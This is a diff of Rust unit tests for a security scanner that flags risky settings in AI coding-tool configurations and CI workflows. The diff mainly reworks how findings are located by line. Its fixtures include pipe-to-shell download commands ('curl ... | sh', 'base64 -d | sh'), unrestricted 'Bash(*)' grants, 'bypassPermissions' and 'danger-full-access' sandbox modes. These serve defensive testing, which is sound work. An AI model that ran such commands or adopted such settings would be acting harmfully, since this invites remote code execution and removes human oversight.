+    /// A marker inside a value is not a comment, and a line of JSON holding
+    /// one would otherwise lose the key that follows it on the same line.
+    #[test]
+    fn a_marker_inside_a_value_does_not_hide_the_key_after_it() {
+        let json =
+            "{\"note\": \"# or // are literal here\", \"sandbox_mode\": \"danger-full-access\"}\n";
+
+        let at = Places::given(json, Format::Json, &["sandbox_mode"], &[])
+            .nth("danger-full-access", 0)
+            .expect("placed");
+
+        let (position, _) = placed(json, at).expect("a position");
+        assert_eq!(position.line, 1);
+    }
+
+    /// Only a comment is skipped. A file that writes the key once, plainly,
+    /// is still placed at it.
+    #[test]
+    fn a_key_written_once_is_placed_where_it_is() {
+        let toml = "approval_policy = \"never\"\nsandbox_mode = \"workspace-write\"\n";
+
+        let at = Places::given(toml, Format::Toml, &["sandbox_mode"], &[])
+            .nth("workspace-write", 0)
+            .expect("placed");
+
+        assert_eq!(placed(toml, at).expect("a position").0.line, 2);
+    }
 
     /// A `crushrc` is Bash that Crush sources at startup, and it carries
     /// neither a shell extension nor a `#!` line. Nothing but its name says it
@@ -382,6 +863,7 @@ mod tests {
 
     fn declared(name: &str, trusted: bool) -> McpServer {
         McpServer {
+            block: "mcpServers".to_owned(),
             name: name.to_owned(),
             transport: crate::mcp_server::Transport::local("srv".to_owned(), &[]),
             env: Vec::new(),
@@ -395,6 +877,7 @@ mod tests {
                 path: &RepoPath::root().join(".gemini/settings.json"),
                 server,
                 source,
+                at: at_of(source, &server.block, &server.name),
             },
             &[RuleId::TrustedServer],
             DEFAULT_EVIDENCE_WIDTH,
@@ -439,7 +922,8 @@ mod tests {
                 path: &RepoPath::root().join(".vscode").join("tasks.json"),
                 task,
                 source,
-                occurrence,
+                at: Places::given(source, Format::Json, &["runOn"], &[])
+                    .nth(task.runs_on.as_deref().unwrap_or_default(), occurrence),
             },
             &[RuleId::AutoRunTask],
             DEFAULT_EVIDENCE_WIDTH,
@@ -488,6 +972,7 @@ mod tests {
 
     fn reached_at(name: &str, url: &str) -> McpServer {
         McpServer {
+            block: "mcpServers".to_owned(),
             name: name.to_owned(),
             transport: crate::mcp_server::Transport::remote(url),
             env: Vec::new(),
@@ -501,6 +986,7 @@ mod tests {
                 path: &RepoPath::root().join(".mcp.json"),
                 server,
                 source,
+                at: at_of(source, &server.block, &server.name),
             },
             &[RuleId::PlaintextTransport],
             DEFAULT_EVIDENCE_WIDTH,
@@ -639,14 +1125,22 @@ mod tests {
             "servers",
             "mcp",
         ];
-        assert_eq!(keys.len(), SERVER_BLOCKS.len(), "a key has no case here");
+        assert_eq!(
+            keys.len(),
+            crate::mcp_server::BLOCKS.len(),
+            "a key has no case here"
+        );
         for key in keys {
             let source = format!(
                 "{{\n  \"{key}\": {{\n    \"pg\": {{\n      \"url\": \"http://h.invalid/x\"\n    }}\n  }}\n}}\n"
             );
 
-            let found = transport_found_in(&reached_at("pg", "http://h.invalid/x"), &source)
-                .expect("a finding");
+            let declared = McpServer {
+                block: key.to_owned(),
+                ..reached_at("pg", "http://h.invalid/x")
+            };
+
+            let found = transport_found_in(&declared, &source).expect("a finding");
 
             assert_eq!(found.at.map(|p| p.line), Some(3), "{key}: {found:?}");
         }
@@ -698,7 +1192,8 @@ mod tests {
                 &Examined::Server {
                     path: &RepoPath::root().join(".mcp.json"),
                     server: &declared("pg", true),
-                    source
+                    source,
+                    at: at_of(source, "mcpServers", "pg"),
                 },
                 &[RuleId::InvisibleUnicode],
                 DEFAULT_EVIDENCE_WIDTH
@@ -799,12 +1294,22 @@ mod tests {
     }
 
     fn grant_found_in(entry: &str, source: &str, occurrence: usize) -> Option<Finding> {
+        grant_found_as(entry, source, occurrence, Format::Json)
+    }
+
+    fn grant_found_as(
+        entry: &str,
+        source: &str,
+        occurrence: usize,
+        format: Format,
+    ) -> Option<Finding> {
         judge(
             &Examined::Grant {
                 path: &RepoPath::root().join(".claude/settings.json"),
                 grant: &grant(entry),
                 source,
-                occurrence,
+                at: Places::given(source, format, place::GRANT_LISTS, place::GRANT_BUILTIN)
+                    .nth(entry, occurrence),
             },
             &[RuleId::UnrestrictedShell],
             DEFAULT_EVIDENCE_WIDTH,
@@ -825,23 +1330,47 @@ mod tests {
         assert!(found.evidence.as_str().contains("Bash(*)"));
     }
 
-    /// Every key a tool lists its pre-approvals under, counted. A spelling
-    /// absent from `GRANT_LISTS` still yields the finding, placed at the file
-    /// rather than the line, so only an assertion on the line catches it.
+    /// Every path a tool lists its pre-approvals under, counted, each written
+    /// as the block it sits in. A path absent from `GRANT_LISTS` still yields
+    /// the finding, placed at the file rather than the line, so only an
+    /// assertion on the line catches it.
     ///
     /// Named here rather than read from the list, because a test that iterates
     /// the list it is checking passes by dropping a case whenever the list
     /// loses one.
     #[test]
     fn a_finding_is_placed_under_each_grant_key() {
-        let keys = ["allow", "allowed-tools", "allowed_tools", "allowed"];
-        assert_eq!(keys.len(), GRANT_LISTS.len(), "a key has no case here");
-        for key in keys {
-            let source = format!("{{\n  \"{key}\": [\n    \"Bash\"\n  ]\n}}\n");
+        let paths = [
+            (
+                "permissions.allow",
+                "{\n  \"permissions\": {\n    \"allow\": [\"Bash\"]\n  }\n}\n",
+                3,
+            ),
+            (
+                "permissions.allowed_tools",
+                "{\n  \"permissions\": {\n    \"allowed_tools\": [\"Bash\"]\n  }\n}\n",
+                3,
+            ),
+            (
+                "tools.allowed",
+                "{\n  \"tools\": {\n    \"allowed\": [\"Bash\"]\n  }\n}\n",
+                3,
+            ),
+            (
+                "allowed-tools",
+                "{\n  \"allowed-tools\": [\"Bash\"]\n}\n",
+                2,
+            ),
+        ];
+        assert_eq!(
+            paths.len(),
+            place::GRANT_LISTS.len(),
+            "a path has no case here"
+        );
+        for (path, source, line) in paths {
+            let found = grant_found_in("Bash", source, 0).expect("a finding");
 
-            let found = grant_found_in("Bash", &source, 0).expect("a finding");
-
-            assert_eq!(found.at.map(|p| p.line), Some(3), "{key}: {found:?}");
+            assert_eq!(found.at.map(|p| p.line), Some(line), "{path}: {found:?}");
         }
     }
 
@@ -884,11 +1413,22 @@ mod tests {
             "permissionsx allow bash\n",
         ] {
             assert!(
-                after_words(source, GRANT_BUILTIN, "bash", 0).is_none(),
+                Places::given(source, Format::Crushrc, &[], place::GRANT_BUILTIN)
+                    .nth("bash", 0)
+                    .is_none(),
                 "{source:?}"
             );
         }
-        assert!(after_words("permissions allow bash\n", GRANT_BUILTIN, "bash", 0).is_some());
+        assert!(
+            Places::given(
+                "permissions allow bash\n",
+                Format::Crushrc,
+                &[],
+                place::GRANT_BUILTIN,
+            )
+            .nth("bash", 0)
+            .is_some()
+        );
     }
 
     #[test]
@@ -917,7 +1457,13 @@ mod tests {
                     path: &RepoPath::root().join(".claude/settings.json"),
                     grant: &grant("Bash(*)"),
                     source,
-                    occurrence: 0
+                    at: Places::given(
+                        source,
+                        Format::Json,
+                        place::GRANT_LISTS,
+                        place::GRANT_BUILTIN,
+                    )
+                    .nth("Bash(*)", 0),
                 },
                 &[RuleId::InvisibleUnicode],
                 DEFAULT_EVIDENCE_WIDTH
@@ -931,13 +1477,39 @@ mod tests {
     /// Two copies of one grant are two findings, each at its own copy.
     #[test]
     fn two_identical_grants_are_placed_separately() {
-        let source = "{\n  \"allow\": [\n    \"Bash(*)\",\n    \"Bash(*)\"\n  ]\n}\n";
+        let source = "{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(*)\",\n      \"Bash(*)\"\n    ]\n  }\n}\n";
 
         let first = grant_found_in("Bash(*)", source, 0).expect("a finding");
         let second = grant_found_in("Bash(*)", source, 1).expect("a finding");
 
-        assert_eq!(first.at.map(|p| p.line), Some(3));
-        assert_eq!(second.at.map(|p| p.line), Some(4));
+        assert_eq!(first.at.map(|p| p.line), Some(4));
+        assert_eq!(second.at.map(|p| p.line), Some(5));
+    }
+
+    /// A grant is looked for under the key the tool actually reads it from.
+    /// A leaf on its own is matched in any block that spells it, so an
+    /// unrelated `allow` list earlier in the file took the finding and
+    /// quoted a line the tool grants nothing by.
+    #[test]
+    fn a_grant_under_another_block_is_not_the_one_read() {
+        let source = "{\n  \"mcpServers\": {\n    \"proxy\": { \"allow\": [\"Bash(*)\"] }\n  },\n  \"permissions\": {\n    \"allow\": [\"Bash(*)\"]\n  }\n}\n";
+
+        let found = grant_found_in("Bash(*)", source, 0).expect("a finding");
+
+        assert_eq!(found.at.map(|p| p.line), Some(6), "{found:?}");
+    }
+
+    /// A file carrying two of the spellings is placed by the one extraction
+    /// reads, which is Claude's: the grant reported came from that list, so
+    /// pointing at the other one would quote a line the finding is not about.
+    /// Counterpart to `the_claude_spelling_wins_when_a_file_carries_both`.
+    #[test]
+    fn a_grant_written_twice_is_placed_where_the_tool_reads_it() {
+        let source = "{\n  \"permissions\": {\n    \"allowed_tools\": [\"Bash(*)\"],\n    \"allow\": [\"Bash(*)\"]\n  }\n}\n";
+
+        let found = grant_found_in("Bash(*)", source, 0).expect("a finding");
+
+        assert_eq!(found.at.map(|p| p.line), Some(4), "{found:?}");
     }
 
     /// A tool name in a description is not a grant. Unanchored, the finding
@@ -954,21 +1526,21 @@ mod tests {
     /// A scope holding the tool's own name is not another grant of it.
     #[test]
     fn a_name_inside_a_scope_is_not_another_grant() {
-        let source = "{\n  \"allow\": [\n    \"Bash(echo Bash)\",\n    \"Bash\"\n  ]\n}\n";
+        let source = "{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(echo Bash)\",\n      \"Bash\"\n    ]\n  }\n}\n";
 
         let found = grant_found_in("Bash", source, 0).expect("a finding");
 
-        assert_eq!(found.at.map(|p| p.line), Some(4), "{found:?}");
+        assert_eq!(found.at.map(|p| p.line), Some(5), "{found:?}");
     }
 
     /// A bare grant is a whole entry, not the start of a longer one.
     #[test]
     fn a_bare_grant_is_not_found_inside_a_scoped_one() {
-        let source = "{\n  \"allow\": [\n    \"Bash(ls)\",\n    \"Bash\"\n  ]\n}\n";
+        let source = "{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(ls)\",\n      \"Bash\"\n    ]\n  }\n}\n";
 
         let found = grant_found_in("Bash", source, 0).expect("a finding");
 
-        assert_eq!(found.at.map(|p| p.line), Some(4), "{found:?}");
+        assert_eq!(found.at.map(|p| p.line), Some(5), "{found:?}");
     }
 
     /// A grant the text does not hold is still worth saying, about the file.
@@ -1036,6 +1608,8 @@ mod tests {
                 path: &RepoPath::root().join(file),
                 mode,
                 source,
+                at: Places::given(source, Format::Json, &[mode.key.as_str()], &[])
+                    .nth(&mode.value, 0),
             },
             &[RuleId::BypassPermissions],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1104,6 +1678,8 @@ mod tests {
                     path: &RepoPath::root().join(".claude/settings.json"),
                     mode: &mode("permissions.defaultMode", "bypassPermissions"),
                     source,
+                    at: Places::given(source, Format::Json, &["permissions.defaultMode"], &[],)
+                        .nth("bypassPermissions", 0),
                 },
                 &[RuleId::InvisibleUnicode],
                 DEFAULT_EVIDENCE_WIDTH,
@@ -1462,8 +2038,7 @@ mod tests {
                 path: &RepoPath::root().join(".github/workflows/ci.yml"),
                 command,
                 source,
-                occurrence: 0,
-                at: None,
+                at: Places::written(source, Format::Yaml).command(command, 0, None),
             },
             &[RuleId::DownloadAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1485,8 +2060,7 @@ mod tests {
                     path: &RepoPath::root().join(".github/workflows/ci.yml"),
                     command,
                     source: &source,
-                    occurrence,
-                    at: None,
+                    at: Places::written(&source, Format::Yaml).command(command, occurrence, None),
                 },
                 &[RuleId::DownloadAndExecute],
                 DEFAULT_EVIDENCE_WIDTH,
@@ -1579,8 +2153,7 @@ mod tests {
                 path: &settings(),
                 command,
                 source: &source,
-                occurrence: 0,
-                at: None,
+                at: Places::written(&source, Format::Yaml).command(command, 0, None),
             },
             &[RuleId::DownloadAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1603,8 +2176,7 @@ mod tests {
                     path: &settings(),
                     command,
                     source: &source,
-                    occurrence,
-                    at: None,
+                    at: Places::written(&source, Format::Yaml).command(command, occurrence, None),
                 },
                 &[RuleId::DownloadAndExecute],
                 DEFAULT_EVIDENCE_WIDTH,
@@ -1624,7 +2196,7 @@ mod tests {
                 path: &settings(),
                 command: "curl -s https://example.invalid | sh",
                 source: "{}",
-                occurrence: 0,
+                // The scan could not find it, which is the case here.
                 at: None,
             },
             &[RuleId::DownloadAndExecute],
@@ -1642,7 +2214,7 @@ mod tests {
                 path: &settings(),
                 command: "curl -s https://example.invalid | sh",
                 source: "{}",
-                occurrence: 0,
+                // Nothing in this text to find, which is the case here.
                 at: None,
             },
             &[RuleId::InvisibleUnicode],
@@ -1697,7 +2269,7 @@ mod tests {
                 path: &settings(),
                 command: "curl -s https://example.invalid | base64 -d | sh",
                 source: "{}",
-                occurrence: 0,
+                // Nothing in this text to find, which is the case here.
                 at: None,
             },
             &[RuleId::DownloadAndExecute, RuleId::DecodeAndExecute],
@@ -1738,7 +2310,7 @@ mod tests {
                 path: &settings(),
                 command: "curl -fsSLo /tmp/x https://example.invalid/x && /tmp/x",
                 source: "{}",
-                occurrence: 0,
+                // Nothing in this text to find, which is the case here.
                 at: None,
             },
             &[RuleId::DownloadAndExecute, RuleId::UnverifiedDownload],
@@ -1775,7 +2347,7 @@ mod tests {
                 path: &settings(),
                 command: "npx claude-flow@latest hooks pre-edit",
                 source: "{}",
-                occurrence: 0,
+                // Nothing in this text to find, which is the case here.
                 at: None,
             },
             &[RuleId::UnpinnedRemotePackage],
